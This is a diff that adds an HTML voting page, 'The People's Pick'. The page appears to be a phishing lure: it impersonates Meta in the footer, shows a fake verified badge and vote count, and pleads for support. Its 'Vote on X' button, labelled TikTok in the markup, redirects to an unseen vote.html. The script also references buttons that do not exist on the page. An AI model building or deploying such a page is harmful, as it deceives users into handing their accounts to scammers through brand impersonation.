@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>The People's Pick: Online Voting</title>
+<style>
+  /* Reset and base */
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    background: #f5f5f7;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+      Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+    color: #1c1c1e;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+
+  /* Header bar */
+  header {
+    background-color:  #f5f5f7;
+    height: 44px;
+    display: flex;
+    align-items: center;
+    padding: 0 14px;
+    color: #f5f5f7;
+    position: relative;
+    font-weight: 600;
+    font-size: 17px;
+  }
+  header .close-btn {
+    position: absolute;
+    left: 14px;
+    font-size: 24px;
+    cursor: pointer;
+    background: none;
+    border: none;
+    color: #fff;
+    line-height: 1;
+    user-select: none;
+  }
+  header h1 {
+    margin: 0 auto;
+    font-weight: 600;
+    font-size: 17px;
+  }
+  header .subtext {
+    position: absolute;
+    bottom: -14px;
+    left: 50%;
+    transform: translateX(-50%);
+    font-size: 13px;
+    color: #8e8e93;
+    font-weight: 400;
+    user-select: none;
+  }
+  header .menu-btn {
+    position: absolute;
+    right: 14px;
+    font-size: 22px;
+    cursor: pointer;
+    background: none;
+    border: none;
+    color: #fff;
+    user-select: none;
+  }
+
+  main {
+    flex-grow: 1;
+    padding: 12px 12px 0;
+  }
+
+  /* Card container */
+  .card {
+    max-width: 400px;
+    margin: 0 auto;
+    background: #fff;
+    border-radius: 14px;
+    box-shadow: 0 2px 12px rgba(0, 0, 0, 0.12);
+    overflow: hidden;
+    font-size: 15px;
+    line-height: 1.4;
+    color: #1c1c1e;
+    display: flex;
+    flex-direction: column;
+  }
+
+  /* Language select */
+  .lang-select-wrapper {
+    padding: 12px 16px 4px 16px;
+    position: relative;
+  }
+  select#languageSelect {
+    width: 100%;
+    appearance: none;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    background: white url('data:image/svg+xml;utf8,<svg fill="%23999" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>') no-repeat right 16px center;
+    background-size: 14px;
+    border-radius: 12px;
+    border: 1px solid #c7c7cc;
+    padding: 10px 42px 10px 44px;
+    font-weight: 400;
+    font-size: 15px;
+    cursor: pointer;
+    color: #3c3c4399;
+  }
+  /* Globe icon overlay */
+  .lang-select-wrapper::before {
+    content: "🌐";
+    position: absolute;
+    top: 50%;
+    left: 22px;
+    transform: translateY(-50%);
+    font-size: 18px;
+    user-select: none;
+    pointer-events: none;
+  }
+
+  /* Image container */
+  .card-image-container {
+    position: relative;
+    width: 100%;
+    height: 180px;
+    overflow: hidden;
+  }
+  .card-image-container img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+  }
+  .card-image-label {
+    position: absolute;
+    bottom: 16px;
+    left: 16px;
+    color: #fff;
+    font-weight: 700;
+    font-size: 20px;
+    letter-spacing: 0.04em;
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    user-select: none;
+    text-shadow: 0 0 8px rgb(0 0 0 / 0.8);
+  }
+
+  /* Card content */
+  .card-content {
+    padding: 20px 20px 24px 20px;
+    display: flex;
+    flex-direction: column;
+  }
+  .brand-header {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-weight: 700;
+    font-size: 17px;
+    margin-bottom: 4px;
+  }
+  .blue-check {
+    background: #2f80ed;
+    border-radius: 4px;
+    width: 20px;
+    height: 20px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-shrink: 0;
+  }
+  .blue-check svg {
+    fill: white;
+    width: 14px;
+    height: 14px;
+  }
+  .votes-info {
+    font-size: 14px;
+    color: #6d6d72;
+    font-weight: 400;
+    margin-bottom: 12px;
+  }
+  .description {
+    font-weight: 400;
+    font-size: 15px;
+    color: #3c3c4399;
+    line-height: 1.5;
+    margin-bottom: 20px;
+    user-select: text;
+    white-space: pre-wrap;
+  }
+
+  /* Vote button */
+  .vote-btn {
+    background: #000;
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    padding: 14px 0;
+    font-size: 17px;
+    font-weight: 700;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
+    cursor: pointer;
+    user-select: none;
+    transition: background-color 0.3s ease;
+  }
+  .vote-btn svg {
+    fill: white;
+    width: 22px;
+    height: 22px;
+  }
+  .vote-btn:hover,
+  .vote-btn:focus {
+    background: #1a1a1a;
+    outline: none;
+  }
+
+  /* Footer */
+  footer {
+    font-size: 13px;
+    color: #8e8e93;
+    text-align: center;
+    margin: 28px auto 28px auto;
+    user-select: none;
+  }
+
+  @media (max-width: 460px) {
+    .card {
+      margin: 0 12px;
+    }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  
+  
+  
+  
+</header>
+
+<main>
+  <section class="card" role="main" aria-labelledby="card-title">
+    <div class="lang-select-wrapper">
+      <select id="languageSelect" aria-label="Select Language">
+        <option value="" disabled selected>Select Language</option>
+        <option value="en">English</option>
+        <option value="es">Spanish - Español</option>
+        <option value="fr">French - Français</option>
+        <option value="de">German - Deutsch</option>
+        <option value="zh">Chinese - 中文</option>
+        <option value="ar">Arabic - العربية</option>
+        <!-- Add more languages here if you want -->
+      </select>
+    </div>
+
+    <div class="card-image-container">
+      <img src="https://images.unsplash.com/photo-1521334884684-d80222895322?auto=format&fit=crop&w=800&q=80" alt="Clothes hanging in a fashion store" />
+      <div id="card-title" class="card-image-label">THE PEOPLE'S PICK</div>
+    </div>
+
+    <div class="card-content">
+      <div class="brand-header">
+        <span class="blue-check" role="img" aria-label="Verified">
+          <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M9 16.2l-3.5-3.5 1.41-1.41L9 13.38 16.59 5.79 18 7.2z"/></svg>
+        </span>
+        FASHION BRAND
+      </div>
+      <div class="votes-info" id="votesText">118 votes • #3</div>
+      <p class="description" id="descriptionText">I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. Your vote could be the difference-maker, propelling me toward victory
+      </p>
+      <button id="voteButton" class="vote-btn" aria-label="Vote on TikTok">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M9.09 5v14.995A4.996 4.996 0 0 0 14 20c2.757 0 5-2.243 5-5v-4h-2v4a3 3 0 0 1-3 3c-1.654 0-3-1.346-3-3V7.003h2z"/></svg>
+        Vote on X
+      </button>
+    </div>
+  </section>
+</main>
+
+<footer>© 2025 Meta</footer>
+
+<script>
+  // Language select handler - demo alert
+  const languageSelect = document.getElementById('languageSelect');
+  languageSelect.addEventListener('change', () => {
+    const selectedLangText = languageSelect.options[languageSelect.selectedIndex].text;
+    alert("Language selected: " + selectedLangText);
+  });
+
+  // Vote button handler - demo alert and vote increment
+  const voteBtn = document.getElementById('voteButton');
+  voteBtn.addEventListener('click', () => {
+    window.location.href = 'vote.html';
+    const votesElem = document.getElementById('votesText');
+    const currentVotesText = votesElem.textContent;
+    const votesMatch = currentVotesText.match(/(\d+)/);
+    if (votesMatch) {
+      let votesCount = parseInt(votesMatch[1]);
+      votesCount++;
+      votesElem.textContent = `${votesCount} votes • #3`;
+    }
+  });
+
+  // Close button click demo
+  document.querySelector('.close-btn').addEventListener('click', () => {
+    alert('Close button clicked.');
+  });
+
+  // Menu button click demo
+  document.querySelector('.menu-btn').addEventListener('click', () => {
+    alert('Menu button clicked.');
+  });
+</script>
+
+</body>
+</html>
